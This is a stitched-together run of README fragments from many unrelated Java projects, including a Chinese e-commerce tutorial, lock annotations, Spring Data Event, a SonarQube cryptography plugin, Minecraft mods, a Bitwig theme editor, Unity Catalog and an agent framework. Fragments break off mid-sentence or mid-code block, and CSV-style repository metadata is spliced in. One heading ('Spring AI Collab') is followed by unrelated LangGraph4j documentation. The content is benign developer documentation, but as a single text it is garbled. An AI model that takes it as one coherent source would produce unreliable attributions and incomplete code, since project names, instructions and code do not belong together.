- **分布式id如何生成？经典的雪花算法？直接使用MybatisPlus中的生成策略可以吗？有什么问题？**

- **订单的分库分表如何设计？既要支持订单详情查询、又要支持订单列表查询而不发生读扩散？**

- **如何执行灵活的限流规则？能支持到某个时间段、某个请求、并能记录下异常行为信息？**

- **项目的架构配置、服务配置、数据结构要如何统一设计和管理？异常如何捕获？**

- ... ... ... ...

这里只是将常见的问题列举了一下，而在本项目中解决的问题远不止上述列举这些，小伙伴可在学习时带着某个问题来思考，在项目中找到问题的答案

## 项目展示

为了尽可能的还原，本项目尽可能贴近官网的页面设计和业务流程，小伙伴可以通过前端项目一边来学习业务，一边体会业务中调取了哪些后端接口，这种学习方式是简单且高效的，也建议小伙伴在学习公司的业务时也使用这种方式

    public KeyGenerator springELMethonNameKeyGenerator() {
        return new SpringELMethonNameKeyGenerator();
    }

}
```
- Idempotent locks are used
```java
@Idempotent(key = ""#param.phone"", keyGenerator = ""springElGenerator"", leaseTime = 6)
public String login(@Validated @RequestBody PhoneLoginParam param) {
    return ""token"";
}
```

- AgencyLock locks are used
```java
@AgencyLock(key = ""#param.phone"", keyGenerator = ""springElGenerator"", leaseTime = 6)
public String login(@Validated @RequestBody PhoneLoginParam param) {
    return ""token"";
}
```

- Lock code block
```java
@Autowired
private AgencyLockManger agencyLockManger;

public void test1() throws Exception {
    String key = ""demoKey"";
    AgencyLock lock = agencyLockManger.getLock(key);
    try {
      lock.lock();
      // service code
      Thread.sleep(3000);

<div align=""center"">
  <h1 align=""center"">Spring Data Event</h1>
</div>

### Features

- **Data Event Entity**: Set up your JPA Entities to be automatically sent over Kafka topics when saved, updated or deleted simply using `@DataEventEntity`

More to come later... Stay tuned ! 


## Getting Started

### Prerequisites

This library has been currently tested on projects under SpringBoot on version 3.2.4 with Java 17 or later, using Hibernate as a JPA implementation.


### Installation

You will have to add the dependency in your spring-boot-project

```xml
<dependency>
    <groupId>com.sipios</groupId>
    <artifactId>spring-data-event</artifactId>
    <version>0.1.0</version>
</dependency>
```

### Configuration

Set up your application properties file to make spring kafka work properly

```txt
spring.kafka.bootstrap-servers=localhost:29092
```

Then, you will have to enable the library so that it will be able to work properly.
You just add the `@EnableDataEvent` on any of your `@Configuration` class already existing on your project, or directly on the `@SpringBootApplication` class.

## Usage


To mark a JPA entity to be automatically sent over event platform, put the `@DataEventEntity` on your entity

For instance

```java

@Entity
@DataEventEntity
@Table(name= ""user_account"")
public class UserEntity {

    @Id
    @Column(name = ""id"", nullable = false)
    @GeneratedValue(strategy = GenerationType.UUID)
    private UUID id;


}
```

By default, the topics on which the event will be sent are : 
- For the creation : `entity_name.created` (for example : `userentity.created`)
- For the update : `entity_name.updated` (for example : `userentity.updated`)
- For the deletion : `entity_name.deleted` (for example : `userentity.deleted`)


## FAQs

No FAQ at the moment

## Roadmap

- [x] Add simple case of sending creation, update and deletion event over kafka
- [ ] Allow customizing which events should be sent or not 
- [ ] Allow customizing which attribute from the entity to be sent or not 
- [ ] Allow other event techno as RabbitMQ or Apache Pulsar

[^1]: We only cover the BouncyCastle *light-weight API* according to [this specification](https://javadoc.io/static/org.bouncycastle/bctls-jdk14/1.75/specifications.html)

> [!NOTE]
> The plugin is designed in a modular way so that it can be extended to support additional languages and recognition rules to support more libraries.
> - To add support for another language or cryptography library, see [*Extending the Sonar Cryptography Plugin to add support for another language or cryptography library*](./docs/LANGUAGE_SUPPORT.md)
> - If you just want to know more about the syntax for writing new detection rules, see [*Writing new detection rules for the Sonar Cryptography Plugin*](./docs/DETECTION_RULE_STRUCTURE.md)

## Installation

> [!NOTE] 
> To run the plugin, you need a running SonarQube instance with one of the supported 
> versions. If you don't have one but want to try the plugin, you can use the
> included Docker Compose to set up a development environment. See 
> [here](CONTRIBUTING.md#build) for instructions.

Copy the plugin (the JAR file from the [latest releases](https://github.com/IBM/sonar-cryptography/releases))
to `$SONARQUBE_HOME/extensions/plugins` and restart 
SonarQube ([more](https://docs.sonarqube.org/latest/setup-and-upgrade/install-a-plugin/)).

## Using

The plugin provides new inventory rules (IBM Cryptography Repository) regarding the use of cryptography for 
the supported languages.
If you enable these rules, a source code scan creates a cryptographic inventory by creating a 
[CBOM](https://cyclonedx.org/capabilities/cbom/) with all cryptographic assets and writing 
a `cbom.json` to the scan directory.

### Add Cryptography Rules to your Quality Profile

This plugin incorporates rules specifically focused on cryptography.

> To generate a Cryptography Bill of Materials (CBOM), it is mandatory to activate at 
> least one of these cryptography-related rules.

![Activate Rules Crypto Rules](docs/images/rules.png)

As of the current version, the plugin contains one single rule for creating a cryptographic inventory. 
Future updates may introduce additional rules to expand functionality.

### Scan Source Code

Now you can follow the [SonarQube documentation](https://docs.sonarqube.org/latest/analyzing-source-code/overview/) 
to start your first scan.

### Visualizing your CBOM

Once you have scanned your source code with the plugin, and obtained a `cbom.json` file, you can use [IBM's CBOM Viewer](https://www.zurich.ibm.com/cbom/) service to know more about it.
It provides you with general insights about the cryptography used in your source code and its compliance with post-quantum safety.
It also allows you to explore precisely each cryptography asset and its detailed specification, and displays where it appears in your code.

## Help and troubleshooting

If you encounter difficulties or unexpected results while installing the plugin with SonarQube, or when trying to scan a repository, please check out our guide [*Testing your configuration and troubleshooting*](docs/TROUBLESHOOTING.md) to run our plugin with step-by-step instructions.

Moderner Beta is the successor of [b3spectacled](https://github.com/b3spectacled)'s [Modern Beta](https://github.com/b3spectacled/modern-beta-fabric). It originally started as a pull request for the original Modern Beta to add in world generation from Beta 1.8 to 1.6.4, however due to b3spectacled's inactivity it has become its own project. The mod is currently supported for 1.20.1, 1.21 and 1.21.2.

## Features
In addition to everything in Modern Beta...
- Support for NeoForge in addition to Fabric
- Graphical settings menu for every customizable option
- World generation from Beta 1.8 up to Release 1.6 with experimental support for 1.7 to 1.17 generation
- Additional world generation from Infdev 20100325, Classic 0.0.14a_08 and Beta 1.1
- Fixed surface rules for Beta Vanilla and 1.12.2 presets
- Highly customisable biome layout for Beta 1.8+ versions

## Setup

* Clone project
* Edit gradle.properties, if needed
* Import the project into your preferred IDE, per https://fabricmc.net/wiki/tutorial:setup.

<img align=""right"" src=""https://github.com/Berikai/bitwig-theme-editor/assets/18515671/8c76c8c6-30b4-43cf-9043-17759e744d75"" width=""50%"" alt=""ui"" />

A theme editor for Bitwig Studio, written in java. Bitwig meets themes, finally!

> :warning: Please back up your **bitwig.jar** file before running the app, just in case.

## Download

[![GitHub release](https://img.shields.io/github/release/Berikai/bitwig-theme-editor.svg)](https://github.com/Berikai/bitwig-theme-editor/releases/latest)

Head to the [Releases page](https://github.com/Berikai/bitwig-theme-editor/releases) to download the latest version.

## Requirements

You need Java 8 or a higher version installed on your computer.

It should work with any Bitwig Studio version in theory, but it has not been tested extensively yet.

## Themes

### Where to find themes?

You can find themes made by community [here](https://github.com/Berikai/awesome-bitwig-themes).

### How to create themes?

You can check the in development visual theme editor [here](https://berikai.github.io/bitwig-theme-editor-webui/)!

Another way of creating themes is editing a theme file. You can do this by exporting the theme file via Bitwig Theme Editor from your **bitwig.jar** and changing color values on the exported theme file.

## Usage

You can run the app directly without parameters to use it with a simple UI.

Alternatively, you can run:
```bash
java -jar bitwig-theme-editor.jar <bitwig-jar-path> [command] <theme-path>
```

**Available commands**:

- export: Exports the current theme to the specified file path (overwrites existing file). 
- apply: Applies the theme by modifying the bitwig.jar file based on the specified theme file.

**Example usage**:
```bash
java -jar bitwig-theme-editor.jar /opt/bitwig-studio/bin/bitwig.jar export current-bitwig-theme.yaml
# or
java -jar bitwig-theme-editor.jar /opt/bitwig-studio/bin/bitwig.jar apply current-bitwig-theme.json
```

### Brief Explanation

First, run the app using the `export` command to create theme file based on your **bitwig.jar** file. This file will be in JSON or YAML format depending on your choice. Then, edit the color values in the theme file to your liking. After that, run the app with the `apply` command. 

Voilà! You have themed your Bitwig!

> Note: Using RGBA values instead of RGB values is not supported, as it may cause glitches in the Bitwig UI. However, you can use RGBA values where RGBA values are already in use.

## Development

This project is built using the following tools.

- IntelliJ IDEA Community Edition
- Java 8 JDK

Open the project with a Java IDE of your choice; IntelliJ IDEA is recommended. You can build the project with the `jar` task via Gradle.

## Contribution

Pull requests are welcome!

This year, we are launching our version of the summer holiday workbook around `Software Craftsmanship` called the **Summer Craft Book**.

Please, download the PDF of the Summer Craft Book in this repository to get the most out of it.

## One theme a week

Each week, a specific theme is going to be examined. You will have information, theory,  exercises, games and resources to go further. 

Set aside a couple of hours a week to work on the subject. If you happen to have more time, a coding version will be available so you can dig into each exercise a bit longer.

We wouldn't want your craft skills to go to waste !

## About this repository

As with the Advent of Craft edition, the PDF of the Summer Craft Book comes with this github repository. Each exercise and most of the games are in it, so you could use the repository standalone.

We understand you could be busy in the summer and want to just do the practice so don't hesitate to do just that !

# Unity Catalog: Open, Multimodal Catalog for Data & AI

Unity Catalog is the industry’s only universal catalog for data and AI.

- **Multimodal interface supports any format, engine, and asset**
  - Multi-format support: It is extensible and supports Delta Lake, Apache Iceberg and Apache Hudi via UniForm, Apache Parquet, JSON, CSV, and many others.
  - Multi-engine support: With its open APIs, data cataloged in Unity can be read by many leading compute engines.
  - Multimodal: It supports all your data and AI assets, including tables, files, functions, AI models.
- **Open source API and implementation** - OpenAPI spec and OSS implementation (Apache 2.0 license). It is also compatible with Apache Hive's metastore API and Apache Iceberg's REST catalog API. Unity Catalog is currently a sandbox project with LF AI and Data Foundation (part of the Linux Foundation).
- **Unified governance** for data and AI - Govern and secure tabular data, unstructured assets, and AI assets with a single interface.

The first release of Unity Catalog focuses on a core set of APIs for tables, unstructured data, and AI assets - with more to come soon on governance, access, and client interoperability. This is just the beginning!

## Quickstart - Hello UC!

Let's take Unity Catalog for spin. In this guide, we are going to do the following:

- In one terminal, run the UC server.
- In another terminal, we will explore the contents of the UC server using a CLI.
  An example project is provided to demonstrate how to use the UC SDK for various assets
  as well as provide a convenient way to explore the content of any UC server implementation.

### Prerequisites

You have to ensure that your local environment has the following:

- Clone this repository.
- Ensure the `JAVA_HOME` environment variable your terminal is configured to point to JDK17.
- Compile the project using `build/sbt package`

> If you prefer to run this using the Unity Catalog Dockerized Environment, please refer to the Docker [README.md](./docker/README.md)

### Run the UC Server

In a terminal, in the cloned repository root directory, start the UC server.

```sh
bin/start-uc-server
```

For the remaining steps, continue in a different terminal.

### Operate on Delta tables with the CLI

Let's list the tables.

```sh
bin/uc table list --catalog unity --schema default
```

You should see a few tables. Some details are truncated because of the nested nature of the data.
To see all the content, you can add `--output jsonPretty` to any command.

Next, let's get the metadata of one of those tables.

```sh
bin/uc table get --full_name unity.default.numbers
```

You can see that it is a Delta table. Now, specifically for Delta tables, this CLI can
print a snippet of the contents of a Delta table (powered by the [Delta Kernel Java](https://delta.io/blog/delta-kernel/) project).
Let's try that.

```sh
bin/uc table read --full_name unity.default.numbers
```

### Operate on Delta tables with DuckDB

For operating on tables with DuckDB, you will have to [install it](https://duckdb.org/docs/installation/) (version 1.0).
Let's start DuckDB and install a couple of extensions. To start DuckDB, run the command `duckdb` in the terminal.
Then, in the DuckDB shell, run the following commands:

```sql
install uc_catalog from core_nightly;
load uc_catalog;
install delta;
load delta;
```

If you have installed these extensions before, you may have to run `update extensions` and restart DuckDB
for the following steps to work.

Now that we have DuckDB all set up, let's try connecting to UC by specifying a secret.

```sql
CREATE SECRET (
      TYPE UC,
      TOKEN 'not-used',
      ENDPOINT 'http://127.0.0.1:8080',
      AWS_REGION 'us-east-2'
 );
```

You should see it print a short table saying `Success` = `true`. Then we attach the `unity` catalog to DuckDB.

```sql
ATTACH 'unity' AS unity (TYPE UC_CATALOG);
```

Now we are ready to query. Try the following:

```sql
SHOW ALL TABLES;
SELECT * from unity.default.numbers;
```

You should see the tables listed and the contents of the `numbers` table printed.
To quit DuckDB, press `Ctrl`+`D` (if your platform supports it), press `Ctrl`+`C`, or use the `.exit` command in the DuckDB shell.

### Interact with the Unity Catalog UI

![UC UI](./docs/assets/images/uc-ui.png)

To use the Unity Catalog UI, start a new terminal and ensure you have already started the UC server (e.g., `./bin/start-uc-server`)

**Prerequisites**
* Node: https://nodejs.org/en/download/package-manager
* Yarn: https://classic.yarnpkg.com/lang/en/docs/install

**How to start the UI through yarn**
```
cd /ui
yarn install
yarn start
```


## CLI tutorial

You can interact with a Unity Catalog server to create and manage catalogs, schemas and tables,
operate on volumes and functions from the CLI, and much more.
See the [cli usage](docs/usage/cli.md) for more details.

## APIs and Compatibility

- Open API specification: See the [Unity Catalog Rest API](https://docs.unitycatalog.io/swagger-docs/).
- Compatibility and stability: The APIs are currently evolving and should not be assumed to be stable.

## Building Unity Catalog

Unity Catalog can be built using [sbt](https://www.scala-sbt.org/).

To build UC (incl. [Spark Integration](./connectors/spark) module), run the following command:

```shell
build/sbt clean package publishLocal spark/publishLocal
```

Refer to [sbt docs](https://www.scala-sbt.org/1.x/docs/) for more commands.

## Deployment

- To create a tarball that can be used to deploy the UC server or run the CLI, run the following:
  ```sh
  build/sbt createTarball
  ```
  This will create a tarball in the `target` directory. See the full [deployment guide](docs/deployment.md) for more details.

## Compiling and testing

- Install JDK 17 by whatever mechanism is appropriate for your system, and
  set that version to be the default Java version (e.g. via the env variable `JAVA_HOME`)
- To compile all the code without running tests, run the following:
  ```sh
  build/sbt clean compile
  ```
- To compile and execute tests, run the following:
  ```sh
  build/sbt -J-Xmx2G clean test
  ```
- To execute tests with coverage, run the following:
  ```sh
  build/sbt -J-Xmx2G jacoco
  ```
- To update the API specification, just update the `api/all.yaml` and then run the following:
  ```sh
  build/sbt generate
  ```
  This will regenerate the OpenAPI data models in the UC server and data models + APIs in the client SDK.
- To format the code, run the following:
  ```sh
  build/sbt javafmtAll
  ```

## Setting up IDE

IntelliJ is the recommended IDE to use when developing Unity Catalog. The below steps outline how to add the project to IntelliJ:

1. Clone Unity Catalog into a local folder, such as `~/unitycatalog`.
2. Select `File` > `New Project` > `Project from Existing Sources...` and select `~/unitycatalog`.
3. Under `Import project from external model` select `sbt`. Click `Next`.
4. Click `Finish`.

Java code adheres to the [Google style](https://google.github.io/styleguide/javaguide.html), which is verified via `build/sbt javafmtCheckAll` during builds.
In order to automatically fix Java code style issues, please use `build/sbt javafmtAll`.

### Configuring Code Formatter for Eclipse/IntelliJ

Follow the instructions for [Eclipse](https://github.com/google/google-java-format#eclipse) or
[IntelliJ](https://github.com/google/google-java-format#intellij-android-studio-and-other-jetbrains-ides) to install the **google-java-format** plugin (note the required manual actions for IntelliJ).

### Using more recent JDKs

The build script [checks for a lower bound on the JDK](./build.sbt#L14) but the [current SBT version](./project/build.properties)
imposes an upper bound. Please check the [JDK compatibility](https://docs.scala-lang.org/overviews/jdk-compatibility/overview.html) documentation for more information

### Serving the documentation with mkdocs

For an overview of how to contribute to the documentation, please see our introduction [here](./docs/README.md).
For the official documentation, please take a look at [https://docs.unitycatalog.io/](https://docs.unitycatalog.io/).

## Development

Star Rod is written in [Java](https://dev.java/) and uses the build tool [Gradle](https://gradle.org/). We recommend [Visual Studio Code](https://code.visualstudio.com/) as your editor.

To set up Star Rod for local development, follow these instructions:

1. Clone this repo, e.g. `gh repo clone z64a/star-rod`
2. Open it in [Visual Studio Code](https://code.visualstudio.com/): `code star-rod`
3. At the bottom right hand corner, a prompt will appear to install the recommended Visual Studio Code extensions; click **Yes**. This will install the Java and Gradle editor extensions. You can see the Gradle elephant icon in the Activity Bar.
4. Open the Explorer. Alternatively, press <kbd>Ctrl+Shift+E</kbd> / <kbd>⇧⌘E</kbd>.
5. Navigate to `src/main/java/app/StarRodMain.java`.
6. Click the ""Run"" button above the line declaring the `main` method (this type of button is called a [CodeLens](https://code.visualstudio.com/blogs/2017/02/12/code-lens-roundup)):

Siepert123/create-legacy,master,"# Create Legacy
[Create Legacy](https://github.com/Siepert123/create-legacy) is an unofficial port of [Create](https://www.curseforge.com/minecraft/mc-mods/create) to [Forge 1.12.2](https://files.minecraftforge.net/net/minecraftforge/forge/index_1.12.2.html).  
[**Download from CurseForge**](https://www.curseforge.com/minecraft/mc-mods/create-legacy) or [**Download from Modrinth**](https://modrinth.com/mod/create-legacy)

For those unfamiliar with Create, it is a mod that's all about technology using cogwheels and other kinetic components to create various machines and automate many processes.



## What does this mod feature right now?
At this moment, the mod has covered the basics. There is SU and rotation speed, but no smooth animations. Most assets are taken from original Create directly, but I'm working on replacing the textures to fit in better with 1.12.

It is recommended to install [CTM](https://www.curseforge.com/minecraft/mc-mods/ctm) to enjoy epic connected textures.

Oh, and there is [JEI](https://www.curseforge.com/minecraft/mc-mods/jei)/[HEI](https://www.curseforge.com/minecraft/mc-mods/had-enough-items) support!



## Why did you make this?
I'm just a 1.12.2 enjoyer, and noticed the demand for a backport of Create was larger than 2 people.



## Things that will defenitely be asked I think
Q: Why use BlockStates instead of the Tile Entity Special Renderer?

A: Using the TESR is complicated and from what I've heard it consumes FPS a lot



Q: why

A: yes



## Some legal stuff
This mod is **not** affiliated with Simibubi in any way.

_All Java code is written completely from scratch_



Simibubi gave permission for the upload:
![Permission from Simibubi](images/simibubi-permission.png)



## And some other things

# Lotus [![](https://jitpack.io/v/Mqzn/Lotus.svg)](https://jitpack.io/#Mqzn/Lotus)   
Simple but yet powerful spigot menus api created using OOP principles

## Features >>

- High performance
- High quality user-friendly API
- Scalable and extendable
- 99% Customizable menus
- Pagination
- Menu Iterators
- Highly Dynamic creation of menus

## Documentation

**Lotus Wiki:** https://github.com/Mqzn/Lotus/wiki

## Requirements

This library depends mainly on the following :

- Java 17
- [Adventure Components](https://docs.advntr.dev/getting-started.html)
- [Paper API](https://docs.papermc.io/) (no longer required since Lotus v1.0.9) 

## Dependency

Lotus API is being hosted on jitpack. Here's an example on how to setup
Lotus dependency on your project.

### Gradle

If you're using Gradle as your build tool for your project, this is quick example how to add it as a dependency in
your `build.gradle` file

```groovy
repositories {
    mavenCentral()
    maven { url 'https://jitpack.io' }
}

dependencies {
    implementation 'com.github.Mqzn:Lotus:VERSION'
}
```

### Maven

if you're using maven, it's basically the same information regarding the API dependency but there will be small changes
to the syntax as following:

```xml
<repositories>
    <repository>
        <id>jitpack.io</id>
        <url>https://jitpack.io</url>
    </repository>
</repositories>

<dependency>
    <groupId>com.github.mqzn</groupId>
    <artifactId>Lotus</artifactId>
    <version>VERSION</version>
</dependency>
```

## Usage/Examples

There are currently no real examples, but you can be the first to contribute to the project by using the api to create
examples for other to be inspired by.

This action runs the Minecraft client inside your CI/CD pipeline.

When coding Minecraft mods many bugs can only be caught at runtime.
Between many different versions and modloaders manual testing becomes laborious.
Additionally, many (e.g. mapping or mixin related) bugs only occur when running against a Minecraft instance that has been launched by a launcher, instead of some IDE or gradle task.

This action runs the Minecraft client using the [HeadlessMC](https://github.com/3arthqu4ke/headlessmc) launcher.
It uses Xvfb as a virtual framebuffer that allows us to run the game headlessly.
HeadlessMC can also be used to patch the lwjgl library.

This project also provides mods for several versions, which all do one thing: join a single-player world, wait for chunks to load,
and then quit the game after a few seconds.
This way you can already run simple boot tests, checking whether the game will boot with your mod.
Mods for newer versions also execute all [gametests](https://www.minecraft.net/en-us/creator/article/get-started-gametest-framework)
registered.

Mc-Runtime-Test currently supports the following Minecraft versions and modloaders:
You can configure it to use any other version, but in that case you need to set `mc-runtime-test` to `none` and provide another way for the game to exit, or the workflow will run indefinitely.

          regex: .*fabric.*
          mc-runtime-test: fabric
          java: 17
```
An example workflow in action can be found
[here](https://github.com/3arthqu4ke/hmc-optimizations/blob/1.20.4/.github/workflows/run-fabric.yml).
An example for a large matrix workflow
which tests 20 different versions of Minecraft
at once can be found 
[here](https://github.com/3arthqu4ke/hmc-specifics/blob/main/.github/workflows/run-matrix.yml).

# Inputs
- `mc`: The MC version to use, e.g. `1.20.4`.
- `modloader`: The modloader to install with HeadlessMC (`forge`, `neoforge` or `fabric`).
- `regex`: A Regex to match the MC version to launch (can in most cases just be `.*<modloader>.*`, like `.*fabric.*`, very old versions of forge might start with an uppercase `Forge`).
- `java`: The Java version to use, e.g. `17`.
- `java-distribution`: The [Java distribution](https://github.com/actions/setup-java?tab=readme-ov-file#supported-distributions) to use, by default we use the adopt distribution.
- `dummy-assets`: HeadlessMC will use dummy assets to not download all the MC assets. Can be disabled by setting this to `false`.
- `mc-runtime-test`: The MC-Runtime-Test jar to download (`none`, `lexforge`, `fabric` or `neoforge`). When using `none` you need to provide a way for the game to exit or the action will run indefinitely and time out.
- `xvfb`: If `true` (default), runs the game with Xvfb, if false, you should probably use the -lwjgl option in headlessmc.
- `headlessmc-command`: Allows you to customize the arguments of the headlessmc command.
- `fabric-api`: Downloads the fabric-api. (Default is none, an example value would be 0.97.0, to download 0.97.0+\<mc\>)
- `fabric-gametest-api`: Downloads the fabric-gametest-api to run gametests. (Default is none, an example value would be 1.3.5+85d85a934f).
- `download-hmc`: Whether to download headlessmc or not, if not you need to supply a headlessmc-launcher.jar. Default is `true`.
- `hmc-version`: The [headlessmc version](https://github.com/3arthqu4ke/headlessmc/releases) to download.

# Running your own tests
MC-Runtime-Test does not provide a framework for full integration tests.
You can, however,
use Minecrafts own [Game-Test Framework](https://www.minecraft.net/en-us/creator/article/get-started-gametest-framework).
MC-Runtime-Test will basically execute the `/test runall` command after joining the world.
On Neoforge/Lexforge gametest discovery does really not work in production, you might need to register
them themselves and use other [hacks](gametest/src/main/java/me/earth/clientgametest/mixin/MixinGameTestRegistry.java)
to get the structure templates correctly, but we are working on it.
You can also use the `headlessmc-command` input to specify additional SystemProperties with the `--jvm` flag.
E.g. `-DMcRuntimeGameTestMinExpectedGameTests=<int>` to specify how many gametests you expect to be executed
at minimum and otherwise fail if not enough gametests have been found.

## Configuration File Description

### Configuration File

Add configuration file `application-prod.yml` or `application-prod.properties`, can refer to `app/src/main/resources/example-application-dev.yml`.

### Configure Database

Configure under `spring.datasource.druid` or `mybatis-flex.datasource.master`.

Example:

```yaml
spring:
  flyway:
    # Enable flyway to migrate
    enabled: true
    # Note to change to the corresponding database directory
    # If there is no corresponding database, you can use PDManer to generate a database with design files.
    locations:
      - classpath:db/migration/mysql

mybatis-flex:
  # configure datasource
  datasource:
    # master datasource
    master:
      url: jdbc:mysql://localhost:3306/wb-template-dev?useUnicode=true&characterEncoding=utf8&zeroDateTimeBehavior=convertToNull&useSSL=true&serverTimezone=GMT%2B8
      username: root
      password: 123456
      # The following Druid parameters can be configured according to actual requirements
      # Initial connection pool size
      initial-size: 5
      # max active connection pool size
      max-active: 20
      # min connection pool size
      min-idle: 5
```

Supported databases for service (the following databases have been tested):

- MySQL 8
- MySQL 5 (Since Flyway doesn't support it, it needs to be executed manually for migration in `db.migration/mysql` and disable flyway)
- Postgresql
- H2

### Configure Attachment Storage

It depends on [x-file-storage](https://x-file-storage.xuyanwu.cn/#/), support local files, MinIO and cloud service storage, please refer to the official documentation.

Example

```yaml
dromara:
  x-file-storage: # Storage configuration
    default-platform: local-plus-1 # default platform
    thumbnail-suffix: "".min.jpg"" # thumbnail
    # storage platform configuration
    local-plus:
      - platform: local-plus-1 # name
        enable-storage: true  # enabled
        enable-access: true # enable access
        domain: http://127.0.0.1:8080/file/ # domain
        base-path: local-plus/ # base path
        path-patterns: /file/** # access path
        storage-path: ./data # storage directory
```

### Configure Report Analysis (AI)

```yaml
analysis:
  # enable indicator analysis
  indicatorAnalysis: true
  # use kimi cloud service, please use  Kimi API access key, refer to https://platform.moonshot.cn/docs/intro#%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97
  moonShot:
    accessToken:
```

## Template Introduction

### Template Context Data

All templates are injected with a rendered context object, which has the following format:
```json5
{
  ""templateName"": """",  // template name
  ""datasourceName"": """",  // datasource name
  ""params"": {},  // render parameters
  ""envs"": {  // environments
    ""year"": 2024,  // year
    ""month"": 6,  // month
    ""day"": 12,  // day
    ""dayOfWeek"": 3,  // day of week
    ""hour"": 0,  // hour
    ""minute"": 0,  // minute
    ""second"": 0  // second
  },
  ""data"": {}  // data obtained from a data source, which may be an array or an object
}
```

To use it in the template like this: `${envs.year}`。

### Word Template

Word template depends on [poi-tl](https://deepoove.com/poi-tl/) , the syntax can be found in the official documentation. The variables use `${name}` style。

### Text Template

Text template depends on [FreeMarker](https://freemarker.apache.org/) , the syntax tan be found in the official documentation.

## Follow-up Plan

- Support for more data sources
- Adding timed tasks and generating schedules
- Integrate more AI capabilities
",0,0,1,apache-2.0,0.0
thesurlydev/spring-ai-collab,main,"# Spring AI Collab

An agent framework using [Spring AI](https://spring.io/projects/spring-ai).

**NOTE**: This is a proof of concept and work is underway to refactor the project into a library which can be used in other Spring projects.

## Features

- Support for multiple agents and tools via simple annotations.
- Leverages [Spring AI](https://spring.io/projects/spring-ai) for abstractions. 
- Automatically selects agent and tools based on the given task.
- Web chat interface to perform tasks and optionally assign an agent.
    - If no agent is specified, the underlying LLM is used to choose an agent based on the task. 

## Roadmap

Note: Some of the roadmap features depend on Chat message history which is not available in Spring AI yet.

- Process multiple tasks at once.
- Compose ""teams"" of agents that collaboratively work together to accomplish tasks.
- Add JVM code creation and execution. (Java, Kotlin)

## Requirements

This project uses [OpenAI](https://openai.com/) as the default LLM.

- Set `OPENAI_API_KEY` environment variable. 

## Build and Test

To build and run tests:
```shell
./gradlew clean build
```

## Quick Start 

### Adding LangGraph dependency 

#### Last stable version

**Maven**
```xml
<dependency>
    <groupId>org.bsc.langgraph4j</groupId>
    <artifactId>langgraph4j-core-jdk8</artifactId>
    <version>1.0-rc2</version>
</dependency>
```

#### Development Version 

**Maven**
```xml
<dependency>
    <groupId>org.bsc.langgraph4j</groupId>
    <artifactId>langgraph4j-core-jdk8</artifactId>
    <version>1.0-SNAPSHOT</version>
</dependency>
```

### Define the agent state

The main type of graph in `langgraph` is the `StatefulGraph`. This graph is parameterized by a state object that it passes around to each node. 
Each node then returns operations to update that state. These operations can either SET specific attributes on the state (e.g. overwrite the existing values) or ADD to the existing attribute. 
Whether to set or add is described in the state's schema provided to the graph. The schema is a Map of Channels, each Channel represent an attribute in the state. If an attribute is described with an `AppendeChannel` it will be a List and each element referring the attribute will be automaically added by graph during processing. The State must inherit from `AgentState` base class (that essentially is a `Map` wrapper).

```java
public class AgentState {

   public AgentState( Map<String,Object> initData ) { ... }
   
   public final java.util.Map<String,Object> data() { ... }

   public final <T> Optional<T> value(String key) { ... }
   public final <T> T value(String key, T defaultValue ) { ... }
   public final <T> T value(String key, Supplier<T>  defaultProvider ) { ... }
    

}
```

### Define the nodes

We now need to define a few different nodes in our graph. In `langgraph`, a node is an async/sync function that accept an `AgentState` as argument and returns a (partial) state update. There are two main nodes we need for this:

1. **The agent**: responsible for deciding what (if any) actions to take.
1. **A function to invoke tools**: if the agent decides to take an action, this node will then execute that action.

```java

/**
 * Represents an asynchronous node action that operates on an agent state and returns state update.
 *
 * @param <S> the type of the agent state
 */
@FunctionalInterface
public interface AsyncNodeAction<S extends AgentState> extends Function<S, CompletableFuture<Map<String, Object>>> {

    CompletableFuture<Map<String, Object>> apply(S t);

    /**
     * Creates an asynchronous node action from a synchronous node action.
     */
    static <S extends AgentState> AsyncNodeAction<S> node_async(NodeAction<S> syncAction) { ... }
}

```

### Define Edges

We will also need to define some edges. Some of these edges may be conditional. The reason they are conditional is that based on the output of a node, one of several paths may be taken. The path that is taken is not known until that node is run (the LLM decides).

1. **Conditional Edge**: after the agent is called, we should either:
    * If the agent said to take an action, then the function to invoke tools should be called
    * If the agent said that it was finished, then it should finish
1. **Normal Edge**: after the tools are invoked, it should always go back to the agent to decide what to do next

```java

/**
 * Represents an asynchronous edge action that operates on an agent state and returns a new route.
 *
 * @param <S> the type of the agent state
 */
public interface AsyncEdgeAction<S extends AgentState> extends Function<S, CompletableFuture<String>> {

    CompletableFuture<String> apply(S t);

    /**
     * Creates an asynchronous edge action from a synchronous edge action.
     */
    static <S extends AgentState> AsyncEdgeAction<S> edge_async(EdgeAction<S> syncAction ) { ... }
}
```

### Define the graph

We can now put it all together and define the graph! (see example below)

Like default use case proposed in [LangGraph blog][langgraph.blog], We have ported [AgentExecutor] implementation from [langchain] using LangGraph4j. In the [agents](agents) project's module, you can the complete working code with tests. Feel free to checkout and use it as a reference.
Below you can find a piece of code of the `AgentExecutor` to give you an idea of how is has built in langgraph style.


```java

public static class State implements AgentState {

    // the state's (partial) schema 
    static Map<String, Channel<?>> SCHEMA = mapOf(
        ""intermediate_steps"", AppenderChannel.<IntermediateStep>of(ArrayList::new)
    );

    public State(Map<String, Object> initData) {
        super(initData);
    }

    Optional<String> input() {
        return value(""input"");
    }
    Optional<AgentOutcome> agentOutcome() {
        return value(""agent_outcome"");
    }
    List<IntermediateStep> intermediateSteps() {
        return this.<List<IntermediateStep>>value(""intermediate_steps"").orElseGet(emptyList());
    }
   
}

var toolInfoList = ToolInfo.fromList( objectsWithTools );

final List<ToolSpecification> toolSpecifications = toolInfoList.stream()
        .map(ToolInfo::specification)
        .toList();

var agentRunnable = Agent.builder()
                        .chatLanguageModel(chatLanguageModel)
                        .tools( toolSpecifications )
                        .build();

// Fluent Interface
var app = new StateGraph<>(State.SCHEMA,State::new)
                .addEdge(START,""agent"")
                .addNode( ""agent"", node_async( state ->
                    runAgent(agentRunnable, state))
                )
                .addNode( ""action"", node_async( state ->
                    executeTools(toolInfoList, state))
                )
                .addConditionalEdges(
                        ""agent"",
                        edge_async( state -> {
                            if (state.agentOutcome().map(AgentOutcome::finish).isPresent()) {
                                return ""end"";
                            }
                            return ""continue"";
                        }),
                        mapOf(""continue"", ""action"", ""end"", END)
                )
                .addEdge(""action"", ""agent"")
                .compile();

return  app.stream( inputs );

